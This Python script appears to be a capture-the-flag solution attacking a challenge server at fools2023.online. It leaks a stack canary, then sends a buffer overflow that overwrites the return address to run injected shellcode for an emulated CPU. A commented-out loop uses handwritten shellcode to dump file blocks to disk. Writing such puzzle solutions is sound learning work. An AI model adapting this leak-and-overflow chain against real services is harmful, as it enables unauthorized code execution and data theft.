import foolsocket


# read 4 bytes
def format_addr_dump(addr: int) -> bytes:
    b = bytearray()
    for i in range(addr, addr + 8, 2):
        b += b'\xf0' + i.to_bytes(2, byteorder='little')
    return bytes(b)


def extract_data_leak(out: bytes) -> bytes:
    if not out.startswith(b'Please type 1, 2 or 3'):
        raise RuntimeError("Unexpected response for leak")
    hexvals = out[47:].split(b'\n')[0]
    result = bytearray(bytes.fromhex(hexvals.decode('ascii')))
    if len(result) % 2 != 0:
        raise RuntimeError("Unexpected length of leaked bytes, expected power of two")
    # We're dumping by using the read16 format specifier, this undoes
    # the endianess, so we get the correct byte order
    for i in range(0, len(result), 2):
        temp = result[i]
        result[i] = result[i + 1]
        result[i + 1] = temp
    return bytes(result)


def execute_on_infsrv(payload: bytes) -> bytes:
    target_buffer_address = 0xF753
    payload_target_address = 0xF800
    canary_address = 0xFE00
    stack_overwrite_start_address = 0xFE80
    stack_overwrite_value = 0xF800

    f = foolsocket.FoolsSocket("fools2023.online", 13339)
    f.expect(b'characters): ')
    f.communicate(format_addr_dump(canary_address - 2) + b'\n')
    f.expect(b'to leave: ')

    # Extract stack canary
    f.communicate(b'A\n')
    canary = extract_data_leak(f.expect(b'to leave: '))[2:6]
    print(f"Stack canary: {canary}")

    overflow_bytes = b'A' * (payload_target_address - target_buffer_address)
    padding = b'B' * (canary_address - (payload_target_address + len(payload)))
    stack_overwrite_padding = b'S' * (stack_overwrite_start_address - (canary_address + 4))
    stack_overwrite = stack_overwrite_value.to_bytes(2, byteorder='little') * int(
        (0xFF00 - stack_overwrite_start_address) / 2)
    pwn = overflow_bytes + payload + padding + canary + stack_overwrite_padding + stack_overwrite + b'\n'

    f.communicate(pwn)
    return f.read_until_eof()


def main():
    # shellcode = b'\x10\x41\x00\x06\x01\x06\x03'
    # for i in range(0, 0x100):
    #     payload = b'\x10' + i.to_bytes(1, 'little') + b'\x00'
    #     payload += b'\x11\x00\xC0\x06\x04\x00\x00\x00\x00\x00\x00'
    # shellcode = b'\x06\x03\x10\x00\x00\x11\x00\x00\x12\x00\x00\x13\x00\x00\x06\x02\x06\x03'
    # shellcode = b'\x06\x03\x12\x0A\xF8\x99\x08\x00\x06\x03\x00\x00pwnd\x00\x00'

    out = execute_on_infsrv(b'\x10\x41\x00\x06\x01\x06\x03')
    print(out)

    return 

    for i in range(0, 0x100):
        # call swi 4 with the file block id, dump to 0xC000
        payload = b'\x10' + i.to_bytes(1, 'little') + b'\x00'
        payload += b'\x11\x00\xC0'
        payload += b'\x06\x04'
        # dump contents of the file to the connection
        # don't actually care about the size, just dump 0x1000 bytes
        payload += b'\x13\x00\xC0'  # mov r3, 0xC000
        payload += b'\x43'  # movb r0, [r3]
        payload += b'\x06\x01'  # swi 1
        payload += b'\xAB'  # inc r3
        payload += b'\xA5\x00\xD0'  # cmp r3, $D000
        payload += b'\x9D\x0B\xF8'  # jne $F80B
        payload += b'\x06\x03'  # terminate the connection
        out = execute_on_infsrv(payload)
        if len(out) != 0x1000:
            print(f"BLK {format(i, 'X').zfill(2)} failed, either the exploit died or the file just does not exist.")
            continue
        with open(f"../dumps/files_13339/blk_{format(i, 'X').zfill(2)}.bin", "wb") as file:
            file.write(out)


if __name__ == '__main__':
    main()
